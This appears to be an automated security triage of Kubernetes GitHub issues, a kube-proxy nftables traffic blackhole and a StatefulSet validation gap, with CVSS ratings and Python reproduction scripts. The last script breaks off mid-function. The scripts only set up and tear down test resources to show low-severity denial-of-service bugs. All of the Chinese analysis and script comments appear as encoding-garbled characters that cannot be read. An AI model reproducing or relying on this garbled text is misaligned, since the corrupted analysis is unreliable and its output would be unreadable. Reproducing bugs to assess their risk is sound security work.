    *   **Integrity (I): None (N)** - ä¸æ¶‰åŠæ•°æ®ç¯¡æ”¹ã€‚
    *   **Availability (A): Low (L)** - ä»…å¯¼è‡´éƒ¨åˆ†å®¢æˆ·ç«¯çš„æœåŠ¡å¯ç”¨æ€§é™ä½ï¼Œè€Œéå®Œå…¨ä¸­æ–­ã€‚

æ ¹æ®CVSS 3.1è®¡ç®—å™¨ï¼Œè¯„åˆ†ä¸º `4.3` (Medium)ã€‚

5.  **é£é™©åˆ¤å®š**ï¼šæ ¹æ®Issueé£é™©åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼šâ€œåœ¨é£é™©ç±»å‹ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©â€ã€‚ç”±äºæ­¤æ¼æ´åˆ©ç”¨éœ€è¦åˆ›å»ºServiceçš„æƒé™ï¼Œä¸”é€ æˆçš„åæœæ˜¯å±€éƒ¨æ€§çš„DoSï¼Œå› æ­¤ä¸æ„æˆé«˜é£é™©ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥é—®é¢˜æ˜¯ä¸€ä¸ªç”±bugå¯¼è‡´çš„ä½é£é™©å®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import sys
import uuid
import signal
from kubernetes import client, config, stream
from kubernetes.client.rest import ApiException

# è®¾ç½®è„šæœ¬æ€»æ‰§è¡Œè¶…æ—¶
def timeout_handler(signum, frame):
    print("[-] è„šæœ¬æ‰§è¡Œè¶…æ—¶ (è¶…è¿‡120ç§’)ï¼Œå¼ºåˆ¶é€€å‡º...")
    sys.exit(1)

def main():
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(120)  # 2åˆ†é’Ÿè¶…æ—¶

    # åŠ è½½ kubeconfig
    try:
        config.load_kube_config()
    except config.ConfigException:
        print("[-] æ— æ³•åŠ è½½ kubeconfigï¼Œè¯·ç¡®ä¿é…ç½®æ–‡ä»¶ä½äºé»˜è®¤ä½ç½®æˆ–å·²æ­£ç¡®è®¾ç½® KUBECONFIG ç¯å¢ƒå˜é‡ã€‚")
        sys.exit(1)

    core_v1 = client.CoreV1Api()
    apps_v1 = client.AppsV1Api()
    
    unique_id = str(uuid.uuid4())[:8]
    namespace_name = f'poc-nftables-blackhole-{unique_id}'
    deployment_name = 'nginx-deployment'
    service_name = 'nginx-service'
    client_pod_name = 'curl-client'
    
    print("[*] è¿™æ˜¯ä¸€ä¸ªå¤ç°K8s kube-proxyåœ¨nftablesæ¨¡å¼ä¸‹é»‘æ´é—®é¢˜çš„POCã€‚")
    print("[!] å‰ææ¡ä»¶ï¼šä¸€ä¸ªå¤šèŠ‚ç‚¹çš„Kubernetesé›†ç¾¤ï¼Œå¹¶ä¸”kube-proxyæ­£åœ¨ä½¿ç”¨ 'nftables' æ¨¡å¼ã€‚")
    print(f"[*] å°†ä½¿ç”¨å”¯ä¸€å‘½åç©ºé—´: {namespace_name}")

    try:
        # 1. è·å–èŠ‚ç‚¹ä¿¡æ¯
        print("\n[*] æ­¥éª¤ 1: è·å–èŠ‚ç‚¹ä¿¡æ¯å¹¶é€‰æ‹©ä¸¤ä¸ªä¸åŒèŠ‚ç‚¹ã€‚")
        nodes = core_v1.list_node(label_selector="!node-role.kubernetes.io/control-plane")
        if len(nodes.items) < 2:
            print("[-] POCéœ€è¦è‡³å°‘ä¸¤ä¸ªå·¥ä½œèŠ‚ç‚¹æ¥æ¼”ç¤ºé—®é¢˜ã€‚")
            sys.exit(1)
            
        node_with_endpoint = nodes.items[0]
        node_without_endpoint = nodes.items[1]
        
        node_with_endpoint_name = node_with_endpoint.metadata.name
        node_without_endpoint_name = node_without_endpoint.metadata.name
        
        print(f"[+] å°†åœ¨èŠ‚ç‚¹ '{node_with_endpoint_name}' ä¸Šéƒ¨ç½²æœåŠ¡ç«¯Podã€‚")
        print(f"[+] å°†åœ¨èŠ‚ç‚¹ '{node_without_endpoint_name}' ä¸Šéƒ¨ç½²å®¢æˆ·ç«¯Podã€‚")

        # è·å–èŠ‚ç‚¹IPä½œä¸ºExternalIP
        node_ip = None
        for addr in node_without_endpoint.status.addresses:
            if addr.type == "InternalIP":
                node_ip = addr.address
                break
        if not node_ip:
            print(f"[-] æ— æ³•è·å–èŠ‚ç‚¹ '{node_without_endpoint_name}' çš„InternalIPã€‚")
            sys.exit(1)
        
        external_ip = node_ip
        print(f"[+] å°†ä½¿ç”¨èŠ‚ç‚¹ '{node_without_endpoint_name}' çš„IP '{external_ip}' ä½œä¸ºæœåŠ¡çš„ExternalIPã€‚")

        # 2. åˆ›å»ºå‘½åç©ºé—´
        print(f"\n[*] æ­¥éª¤ 2: åˆ›å»ºå‘½åç©ºé—´ '{namespace_name}'ã€‚")
        ns = client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace_name))
        core_v1.create_namespace(ns)

        # 3. åˆ›å»ºæœåŠ¡ç«¯ Deployment
        print(f"\n[*] æ­¥éª¤ 3: åœ¨èŠ‚ç‚¹ '{node_with_endpoint_name}' ä¸Šåˆ›å»ºNginx Deploymentã€‚")
        deployment_spec = client.V1Deployment(
            api_version="apps/v1",
            kind="Deployment",
            metadata=client.V1ObjectMeta(name=deployment_name, namespace=namespace_name),
            spec=client.V1DeploymentSpec(
                replicas=1,
                selector=client.V1LabelSelector(match_labels={"app": "nginx"}),
                template=client.V1PodTemplateSpec(
                    metadata=client.V1ObjectMeta(labels={"app": "nginx"}),
                    spec=client.V1PodSpec(
                        containers=[client.V1Container(
                            name="nginx",
                            image="nginx:alpine",
                            ports=[client.V1ContainerPort(container_port=80)]
                        )],
                        node_selector={"kubernetes.io/hostname": node_with_endpoint_name}
                    )
                )
            )
        )
        apps_v1.create_namespaced_deployment(namespace=namespace_name, body=deployment_spec)

        # 4. åˆ›å»º LoadBalancer Service
        print("\n[*] æ­¥éª¤ 4: åˆ›å»ºå…·æœ‰ 'externalTrafficPolicy: Local' çš„LoadBalanceræœåŠ¡ã€‚")
        service_spec = client.V1Service(
            api_version="v1",
            kind="Service",
            metadata=client.V1ObjectMeta(name=service_name, namespace=namespace_name),
            spec=client.V1ServiceSpec(
                selector={"app": "nginx"},
                ports=[client.V1ServicePort(protocol="TCP", port=80, target_port=80)],
                type="LoadBalancer",
                external_traffic_policy="Local",
                external_i_ps=[external_ip] # python-kubernetesåº“ä¸­å­—æ®µä¸ºexternal_i_ps
            )
        )
        core_v1.create_namespaced_service(namespace=namespace_name, body=service_spec)
        print(f"[+] æœåŠ¡ '{service_name}' åˆ›å»ºæˆåŠŸï¼ŒExternalIPä¸º '{external_ip}'ã€‚")
        
        # 5. ç­‰å¾…æœåŠ¡ç«¯Podå°±ç»ª
        print("\n[*] æ­¥éª¤ 5: ç­‰å¾…æœåŠ¡ç«¯Podå¯åŠ¨å¹¶å°±ç»ª...")
        for i in range(30):
            pods = core_v1.list_namespaced_pod(namespace=namespace_name, label_selector="app=nginx")
            if pods.items and pods.items[0].status.phase == "Running":
                print("[+] æœåŠ¡ç«¯Podå·²å°±ç»ªã€‚")
                break
            time.sleep(2)
        else:
            print("[-] æœåŠ¡ç«¯Podå¯åŠ¨è¶…æ—¶ã€‚")
            raise Exception("Pod readiness timeout")

        # 6. åˆ›å»ºå®¢æˆ·ç«¯ Pod
        print(f"\n[*] æ­¥éª¤ 6: åœ¨èŠ‚ç‚¹ '{node_without_endpoint_name}' ä¸Šåˆ›å»ºå®¢æˆ·ç«¯Podã€‚")
        client_pod_spec = client.V1Pod(
            api_version="v1",
            kind="Pod",
            metadata=client.V1ObjectMeta(name=client_pod_name, namespace=namespace_name),
            spec=client.V1PodSpec(
                containers=[client.V1Container(
                    name="curl",
                    image="curlimages/curl:latest",
                    command=["sleep", "3600"] # ä¿æŒè¿è¡ŒçŠ¶æ€
                )],
                node_selector={"kubernetes.io/hostname": node_without_endpoint_name},
                restart_policy="Never"
            )
        )
        core_v1.create_namespaced_pod(namespace=namespace_name, body=client_pod_spec)
        
        print("[*] ç­‰å¾…å®¢æˆ·ç«¯Podå¯åŠ¨å¹¶å°±ç»ª...")
        for i in range(30):
            pod_status = core_v1.read_namespaced_pod_status(name=client_pod_name, namespace=namespace_name)
            if pod_status.status.phase == "Running":
                print("[+] å®¢æˆ·ç«¯Podå·²å°±ç»ªã€‚")
                break
            time.sleep(2)
        else:
            print("[-] å®¢æˆ·ç«¯Podå¯åŠ¨è¶…æ—¶ã€‚")
            raise Exception("Client Pod readiness timeout")

        # 7. æ‰§è¡Œæµ‹è¯•
        print(f"\n[*] æ­¥éª¤ 7: ä»å®¢æˆ·ç«¯Podè®¿é—®æœåŠ¡ExternalIP '{external_ip}'...")
        print("[*] é¢„æœŸç»“æœï¼šç”±äºé»‘æ´é—®é¢˜ï¼Œè¿æ¥å°†ä¼šè¶…æ—¶ã€‚")
        
        command_to_run = [
            'curl',
            '--connect-timeout',
            '5',
            '-v',
            f'http://{external_ip}:80'
        ]
        
        try:
            # ä½¿ç”¨streamæ‰§è¡Œå‘½ä»¤
            exec_response = stream.stream(
                core_v1.connect_get_namespaced_pod_exec,
                client_pod_name,
                namespace_name,
                command=command_to_run,
                stderr=True, stdin=False,
                stdout=True, tty=False
            )
            print(f"\n--- curlå‘½ä»¤è¾“å‡º ---\n{exec_response}\n----------------------")
            
            # æ£€æŸ¥è¾“å‡ºä¸­æ˜¯å¦æœ‰è¶…æ—¶å…³é”®å­—
            if "Connection timed out" in exec_response or "Operation timed out" in exec_response:
                print("\n[SUCCESS] å¤ç°æˆåŠŸï¼è¿æ¥è¶…æ—¶ï¼Œç¬¦åˆé¢„æœŸã€‚")
                print("è¿™è¯æ˜äº†åœ¨æ²¡æœ‰æœåŠ¡ç«¯ç‚¹çš„èŠ‚ç‚¹ä¸Šï¼Œå‘å¾€ExternalIPçš„æµé‡è¢«ä¸¢å¼ƒäº†ã€‚")
            else:
                print("\n[FAILURE] å¤ç°å¤±è´¥ã€‚è¿æ¥æˆåŠŸæˆ–è¿”å›äº†å…¶ä»–é”™è¯¯ã€‚")
                print("å¯èƒ½åŸå› ï¼škube-proxyæœªä½¿ç”¨nftablesæ¨¡å¼ï¼Œæˆ–è¯¥ç‰ˆæœ¬K8så·²ä¿®å¤æ­¤é—®é¢˜ã€‚")

        except ApiException as e:
            print(f"[-] æ‰§è¡Œcurlå‘½ä»¤æ—¶å‘ç”ŸAPIé”™è¯¯: {e}")
            print("\n[FAILURE] å¤ç°å¤±è´¥ã€‚")


    except Exception as e:
        print(f"\n[ERROR] è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")
    finally:
        # 8. æ¸…ç†èµ„æº
        print("\n[*] æ­¥éª¤ 8: æ¸…ç†æ‰€æœ‰åˆ›å»ºçš„èµ„æº...")
        try:
            core_v1.delete_namespace(name=namespace_name, body=client.V1DeleteOptions())
            print(f"[+] å‘½åç©ºé—´ '{namespace_name}' å·²è¢«æ ‡è®°ä¸ºåˆ é™¤ã€‚")
        except ApiException as e:
            if e.status == 404:
                print(f"[+] å‘½åç©ºé—´ '{namespace_name}' å·²ä¸å­˜åœ¨ï¼Œæ— éœ€æ¸…ç†ã€‚")
            else:
                print(f"[-] æ¸…ç†å‘½åç©ºé—´æ—¶å‘ç”Ÿé”™è¯¯: {e}")
        
        signal.alarm(0) # å–æ¶ˆè¶…æ—¶


# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬é€šè¿‡ç¼–æ’Kubernetesèµ„æºæ¥æ¨¡æ‹Ÿå¹¶éªŒè¯Issueä¸­æè¿°çš„`kube-proxy`åœ¨`nftables`æ¨¡å¼ä¸‹çš„æµé‡é»‘æ´é—®é¢˜ã€‚

1.  **ç¯å¢ƒå‡†å¤‡ä¸æ£€æŸ¥**: è„šæœ¬é¦–å…ˆä¼šåŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ä»¥è¿æ¥åˆ°Kubernetesé›†ç¾¤ã€‚å®ƒä¼šæ£€æŸ¥é›†ç¾¤ä¸­æ˜¯å¦å­˜åœ¨è‡³å°‘ä¸¤ä¸ªå¯ç”¨çš„å·¥ä½œèŠ‚ç‚¹ï¼Œè¿™æ˜¯å¤ç°åœºæ™¯çš„å¿…è¦æ¡ä»¶ï¼šä¸€ä¸ªèŠ‚ç‚¹è¿è¡ŒæœåŠ¡ç«¯Podï¼Œå¦ä¸€ä¸ªèŠ‚ç‚¹è¿è¡Œå®¢æˆ·ç«¯Podã€‚
2.  **èµ„æºéš”ç¦»**: ä¸ºäº†ä¸å½±å“é›†ç¾¤ä¸­çš„å…¶ä»–åº”ç”¨ï¼Œè„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„å‘½åç©ºé—´ï¼ˆä¾‹å¦‚`poc-nftables-blackhole-xxxx`ï¼‰ï¼Œæ‰€æœ‰åç»­èµ„æºéƒ½åœ¨æ­¤å‘½åç©ºé—´å†…åˆ›å»ºã€‚
3.  **åˆ›å»ºæœåŠ¡ç«¯**: è„šæœ¬ä¼šåœ¨ç¬¬ä¸€ä¸ªé€‰å®šçš„èŠ‚ç‚¹ï¼ˆ`node-with-endpoint`ï¼‰ä¸Šéƒ¨ç½²ä¸€ä¸ªç®€å•çš„Nginx Deploymentã€‚é€šè¿‡`nodeSelector`ï¼Œå¯ä»¥ç¡®ä¿Nginx Podè¢«ç²¾ç¡®åœ°è°ƒåº¦åˆ°è¿™ä¸ªèŠ‚ç‚¹ä¸Šã€‚
4.  **æš´éœ²æœåŠ¡**: è¿™æ˜¯å¤ç°é—®é¢˜çš„å…³é”®æ­¥éª¤ã€‚è„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ª`LoadBalancer`ç±»å‹çš„Serviceï¼Œå¹¶é…ç½®`externalTrafficPolicy: Local`ã€‚ä¸ºäº†ä½¿æµ‹è¯•è‡ªåŒ…å«ä¸”å¯é¢„æµ‹ï¼Œè„šæœ¬å·§å¦™åœ°å°†ç¬¬äºŒä¸ªèŠ‚ç‚¹ï¼ˆ`node-without-endpoint`ï¼‰çš„å†…éƒ¨IPåœ°å€ç”¨ä½œè¯¥æœåŠ¡çš„`externalIPs`ã€‚è¿™ä¸€è®¾ç½®ç¡®ä¿äº†`kube-proxy`ä¼šä¸ºè¿™ä¸ªIPåˆ›å»ºè§„åˆ™ã€‚
5.  **åˆ›å»ºå®¢æˆ·ç«¯**: è„šæœ¬ä¼šåœ¨ç¬¬äºŒä¸ªèŠ‚ç‚¹ï¼ˆ`node-without-endpoint`ï¼‰ï¼Œå³æ²¡æœ‰NginxæœåŠ¡ç«¯Podçš„èŠ‚ç‚¹ä¸Šï¼Œåˆ›å»ºä¸€ä¸ªåŒ…å«`curl`å·¥å…·çš„å®¢æˆ·ç«¯Podã€‚
6.  **æ‰§è¡Œæµ‹è¯•**: è„šæœ¬ä¼šç­‰å¾…æ‰€æœ‰Podéƒ½è¿›å…¥`Running`çŠ¶æ€åï¼Œä½¿ç”¨Kubernetes Pythonå®¢æˆ·ç«¯çš„`stream`åŠŸèƒ½ï¼Œåœ¨å®¢æˆ·ç«¯Podå†…éƒ¨æ‰§è¡Œ`curl`å‘½ä»¤ï¼Œå°è¯•è®¿é—®ä¹‹å‰è®¾ç½®çš„æœåŠ¡`ExternalIP`ã€‚å‘½ä»¤ä¸­è®¾ç½®äº†5ç§’çš„è¿æ¥è¶…æ—¶ã€‚
7.  **ç»“æœéªŒè¯**:
    *   **æˆåŠŸåœºæ™¯ï¼ˆé—®é¢˜å¤ç°ï¼‰**: å¦‚æœ`kube-proxy`å­˜åœ¨è¯¥æ¼æ´ï¼Œå®ƒä¼šåœ¨`node-without-endpoint`ä¸Šç”Ÿæˆä¸€æ¡ä¸¢å¼ƒï¼ˆdropï¼‰å‘å¾€`ExternalIP`æµé‡çš„`nftables`è§„åˆ™ã€‚å› æ­¤ï¼Œ`curl`å‘½ä»¤ä¼šå› æ— æ³•å»ºç«‹è¿æ¥è€Œè¶…æ—¶ã€‚è„šæœ¬é€šè¿‡æ£€æŸ¥`curl`çš„è¾“å‡ºä¸­æ˜¯å¦åŒ…å« "Connection timed out" ç­‰å…³é”®å­—æ¥åˆ¤æ–­å¤ç°æ˜¯å¦æˆåŠŸã€‚
    *   **å¤±è´¥åœºæ™¯ï¼ˆé—®é¢˜æœªå¤ç°ï¼‰**: å¦‚æœè¿æ¥æˆåŠŸæˆ–è¿”å›å…¶ä»–éè¶…æ—¶çš„é”™è¯¯ï¼Œåˆ™è¯´æ˜è¯¥é—®é¢˜æœªè¢«å¤ç°ï¼Œå¯èƒ½æ˜¯å› ä¸º`kube-proxy`æœªä½¿ç”¨`nftables`æ¨¡å¼ï¼Œæˆ–è€…é›†ç¾¤ç‰ˆæœ¬å·²ç»ä¿®å¤äº†æ­¤bugã€‚
8.  **èµ„æºæ¸…ç†**: æ— è®ºæµ‹è¯•æˆåŠŸä¸å¦ï¼Œè„šæœ¬çš„`finally`å—éƒ½ä¼šç¡®ä¿åˆ é™¤ä¹‹å‰åˆ›å»ºçš„æ•´ä¸ªå‘½åç©ºé—´ï¼Œä»è€Œæ¸…ç†æ‰æ‰€æœ‰æµ‹è¯•èµ„æºï¼Œä¿æŒé›†ç¾¤çš„æ•´æ´ã€‚

---


## Issue #131761 topologySpreadConstraints are not correctly applied on StatefulSets

- Issue é“¾æ¥ï¼š[#131761](https://github.com/kubernetes/kubernetes/issues/131761)

### Issue å†…å®¹

#### What happened?

I'm using AWS EKS 1.31. I was doing some tests with `topologySpreadConstraints` and I've noticed that the API Server behaves differently on `Deployments` and `StatefulSets` objects.

Using this `test.yaml` YAML file:
```yaml
---
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: statefulset-without-enough-replicas-2
spec:
  selector:
    matchLabels:
      app: test
  replicas: 3
  template:
    metadata:
      labels:
        app: test
    spec:
      topologySpreadConstraints:
        - topologyKey: topology.kubernetes.io/zone
          # commented on purpose to trigger a failure
          # whenUnsatisfiable: DoNotSchedule
          maxSkew: 1
          labelSelector:
            matchLabels:
              app: test
      containers:
      - name: echo-server-container
        image: alpine
        command: ["sleep", "3600"]
        imagePullPolicy: Always
        ports:
        - containerPort: 8080
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-without-enough-replicas-2
spec:
  selector:
    matchLabels:
      app: test
  replicas: 3
  template:
    metadata:
      labels:
        app: test
    spec:
      topologySpreadConstraints:
        - topologyKey: topology.kubernetes.io/zone
          # commented on purpose to trigger a failure
          # whenUnsatisfiable: DoNotSchedule
          maxSkew: 1
          labelSelector:
            matchLabels:
              app: test
      containers:
      - name: echo-server-container
        image: alpine
        command: ["sleep", "3600"]
        imagePullPolicy: Always
        ports:
        - containerPort: 8080
```

When applied, I get a different response from both:
```bash
$ kubectl apply -f test.yaml
statefulset.apps/statefulset-without-enough-replicas-2 created
The Deployment "deployment-without-enough-replicas-2" is invalid: spec.template.spec.topologySpreadConstraints[0].whenUnsatisfiable: Unsupported value: "": supported values: "DoNotSchedule", "ScheduleAnyway"
```

After this, the `Deployment` has been rejected, as the fields are missing (correct), but the `StatefulSet` is accepted and unable to schedule pods, because `whenUnsatisfiable` field is missing:
```
Events:
  Type     Reason           Age                  From                    Message
  ----     ------           ----                 ----                    -------
  Warning  FailedCreate     41s (x15 over 2m3s)  statefulset-controller  create Pod statefulset-without-enough-replicas-2-0 in StatefulSet statefulset-without-enough-replicas-2 failed error: Pod "statefulset-without-enough-replicas-2-0" is invalid: spec.topologySpreadConstraints[0].whenUnsatisfiable: Unsupported value: "": supported values: "DoNotSchedule", "ScheduleAnyway"
```

#### What did you expect to happen?

I expect the validation should behave similarly in both resources, rejecting the resource which lacks of required fields.

#### How can we reproduce it (as minimally and precisely as possible)?

Apply this YAML file:
```yaml
---
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: statefulset-without-enough-replicas-2
spec:
  selector:
    matchLabels:
      app: test
  replicas: 3
  template:
    metadata:
      labels:
        app: test
    spec:
      topologySpreadConstraints:
        - topologyKey: topology.kubernetes.io/zone
          # commented on purpose to trigger a failure
          # whenUnsatisfiable: DoNotSchedule
          maxSkew: 1
          labelSelector:
            matchLabels:
              app: test
      containers:
      - name: echo-server-container
        image: alpine
        command: ["sleep", "3600"]
        imagePullPolicy: Always
        ports:
        - containerPort: 8080
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-without-enough-replicas-2
spec:
  selector:
    matchLabels:
      app: test
  replicas: 3
  template:
    metadata:
      labels:
        app: test
    spec:
      topologySpreadConstraints:
        - topologyKey: topology.kubernetes.io/zone
          # commented on purpose to trigger a failure
          # whenUnsatisfiable: DoNotSchedule
          maxSkew: 1
          labelSelector:
            matchLabels:
              app: test
      containers:
      - name: echo-server-container
        image: alpine
        command: ["sleep", "3600"]
        imagePullPolicy: Always
        ports:
        - containerPort: 8080
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.7
Kustomize Version: v5.5.0
Server Version: v1.31.7-eks-4096722
```

</details>


#### Cloud provider

<details>
AWS EKS
</details>


#### OS version




#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kubernetesä¸­`StatefulSet`å’Œ`Deployment`èµ„æºåœ¨å¤„ç†`topologySpreadConstraints`å­—æ®µæ—¶å­˜åœ¨éªŒè¯ä¸ä¸€è‡´çš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå½“`topologySpreadConstraints`ä¸­ç¼ºå°‘å¿…éœ€çš„`whenUnsatisfiable`å­—æ®µæ—¶ï¼š
1.  `Deployment`çš„åˆ›å»ºè¯·æ±‚ä¼šè¢«API Serveråœ¨å‡†å…¥é˜¶æ®µï¼ˆadmissionï¼‰ç›´æ¥æ‹’ç»ï¼Œè¿™æ˜¯ç¬¦åˆé¢„æœŸçš„æ­£ç¡®è¡Œä¸ºã€‚
2.  `StatefulSet`çš„åˆ›å»ºè¯·æ±‚å´èƒ½é€šè¿‡API Serverçš„å‡†å…¥éªŒè¯ï¼Œèµ„æºè¢«æˆåŠŸåˆ›å»ºã€‚
3.  ç„¶è€Œï¼Œ`statefulset-controller`åœ¨åç»­å°è¯•ä¸ºè¿™ä¸ª`StatefulSet`åˆ›å»ºPodæ—¶ä¼šå¤±è´¥ï¼Œå› ä¸ºå®ƒæ— æ³•å¤„ç†è¿™ä¸ªæ— æ•ˆçš„Podæ¨¡æ¿ã€‚æ§åˆ¶å™¨ä¼šæŒç»­åœ°å°è¯•åˆ›å»ºPodï¼Œå¹¶åœ¨äº‹ä»¶ï¼ˆEventsï¼‰ä¸­è®°å½•ä¸`Deployment`è¢«æ‹’ç»æ—¶ç›¸åŒçš„é”™è¯¯ä¿¡æ¯ã€‚

è¿™ä¸ªä¸ä¸€è‡´çš„è¡Œä¸ºæ„æˆäº†ä¸€ä¸ªæ½œåœ¨çš„å¯ç”¨æ€§é—®é¢˜ï¼Œå¯ä»¥è¢«è§†ä¸ºä¸€ç§ä½å¼ºåº¦çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚æ”»å‡»è€…ï¼ˆä¸€ä¸ªæ‹¥æœ‰åœ¨å‘½åç©ºé—´å†…åˆ›å»º`StatefulSet`æƒé™çš„ç”¨æˆ·ï¼‰å¯ä»¥æ•…æ„åˆ›å»ºå¤§é‡æ­¤ç±»æ— æ•ˆçš„`StatefulSet`ã€‚è¿™å°†å¯¼è‡´`statefulset-controller`ï¼ˆæ§åˆ¶å¹³é¢çš„ä¸€ä¸ªç»„ä»¶ï¼‰é™·å…¥æ— æ•ˆçš„åè°ƒå¾ªç¯ä¸­ï¼Œä¸æ–­åœ°å°è¯•åˆ›å»ºå¤±è´¥çš„Podï¼Œä»è€Œäº§ç”Ÿå¤§é‡é”™è¯¯äº‹ä»¶ï¼Œå¹¶æ¶ˆè€—`statefulset-controller`å’ŒAPI Serverçš„èµ„æºã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
- **Attack Vector (AV): Network** - æ”»å‡»é€šè¿‡Kubernetes APIè¿›è¡Œã€‚
- **Attack Complexity (AC): Low** - ä»…éœ€æäº¤ä¸€ä¸ªç‰¹åˆ¶çš„YAMLæ–‡ä»¶ã€‚
- **Privileges Required (PR): Low** - æ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»º`StatefulSet`çš„æƒé™ï¼Œè¿™é€šå¸¸æ˜¯åˆ†é…ç»™å¼€å‘äººå‘˜æˆ–è‡ªåŠ¨åŒ–ç³»ç»Ÿçš„ä½æƒé™è§’è‰²ï¼Œè€Œéé›†ç¾¤ç®¡ç†å‘˜ã€‚
- **User Interaction (UI): None** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
- **Scope (S): Changed** - æ”»å‡»åˆ©ç”¨äº†API Serverçš„éªŒè¯ç¼ºé™·ï¼Œå½±å“çš„æ˜¯æ§åˆ¶å¹³é¢ç»„ä»¶ï¼ˆ`statefulset-controller`ï¼‰çš„å¯ç”¨æ€§ï¼Œè¯¥ç»„ä»¶è´Ÿè´£ç®¡ç†é›†ç¾¤ä¸­æ‰€æœ‰ç”¨æˆ·çš„`StatefulSet`ï¼Œå› æ­¤èŒƒå›´å·²æ”¹å˜ã€‚
- **Confidentiality (C): None** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
- **Integrity (I): None** - ä¸æ¶‰åŠæ•°æ®ç¯¡æ”¹ã€‚
- **Availability (A): Low** - å¯èƒ½ä¼šå¯¼è‡´`statefulset-controller`æ€§èƒ½ä¸‹é™ï¼Œå¹¶ç”¨å¤§é‡æ— ç”¨çš„äº‹ä»¶æ—¥å¿—æ·¹æ²¡API Serverï¼Œä»è€Œå½±å“å…¶ä»–ç§Ÿæˆ·å¯¹`StatefulSet`çš„æ­£å¸¸æ“ä½œã€‚ä½†ä¸å¤ªå¯èƒ½å¯¼è‡´æ•´ä¸ªæ§åˆ¶å¹³é¢ç˜«ç—ªã€‚

ç»¼åˆè¯„åˆ†ä¸º `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:L`ï¼Œå¾—åˆ†ä¸º **6.4**ï¼Œå±äºä¸­ç­‰é£é™©ã€‚æ ¹æ®åˆ¤æ–­æ ‡å‡†â€œhighä»¥ä¸Šä¸ºé«˜é£é™©ï¼Œå…¶ä»–å‡ä¸ºä½é£é™©â€ï¼Œæ­¤é—®é¢˜è¢«è¯„çº§ä¸º **ä½é£é™©**ã€‚å› ä¸ºåˆ©ç”¨æ­¤æ¼æ´éœ€è¦åˆ›å»ºèµ„æºçš„æƒé™ï¼Œä¸”ä¸»è¦å½±å“æ˜¯å¯ç”¨æ€§é™çº§è€Œéç³»ç»Ÿç˜«ç—ªï¼Œä¸ç¬¦åˆé«˜é£é™©çš„æ ‡å‡†ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
from kubernetes import client, config
import time
import yaml
import logging
import sys
from datetime import datetime, timedelta

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def main():
    """
    Main function to demonstrate the StatefulSet validation issue.
    """
    try:
        # Load Kubernetes configuration from default location
        config.load_kube_config()
        logging.info("Kubernetes configuration loaded successfully.")
    except (config.ConfigException, FileNotFoundError):
        logging.error("Could not load Kubernetes configuration. Ensure you have a valid kubeconfig file.")
        sys.exit(1)

    # Create API clients
    apps_v1 = client.AppsV1Api()
    core_v1 = client.CoreV1Api()

    namespace = "issue-repro-statefulset"
    statefulset_name = "statefulset-invalid-tsc"

    # StatefulSet manifest with invalid topologySpreadConstraints
    # The 'whenUnsatisfiable' field is intentionally omitted.
    statefulset_manifest = {
        "apiVersion": "apps/v1",
        "kind": "StatefulSet",
        "metadata": {
            "name": statefulset_name,
            "namespace": namespace,
        },
        "spec": {
            "selector": {
                "matchLabels": {"app": "test-invalid-tsc"}
            },
            "replicas": 1,
            "serviceName": "dummy-service", # Required for StatefulSet
            "template": {
                "metadata": {
                    "labels": {"app": "test-invalid-tsc"}
                },
                "spec": {
                    "topologySpreadConstraints": [
                        {
                            "topologyKey": "topology.kubernetes.io/zone",
                            "maxSkew": 1,
                            "labelSelector": {
                                "matchLabels": {"app": "test-invalid-tsc"}
                            }
                            # 'whenUnsatisfiable' is missing, which should cause validation failure
                        }
                    ],
                    "containers": [
                        {
                            "name": "poc-container",
                            "image": "alpine",
                            "command": ["sleep", "3600"],
                        }
                    ],
                },
            },
        },
    }

    try:
        # 1. Create a namespace for the test
        try:
            core_v1.create_namespace(client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace)))
            logging.info(f"Namespace '{namespace}' created.")
        except kubernetes.client.exceptions.ApiException as e:
            if e.status == 409: # Conflict, namespace already exists
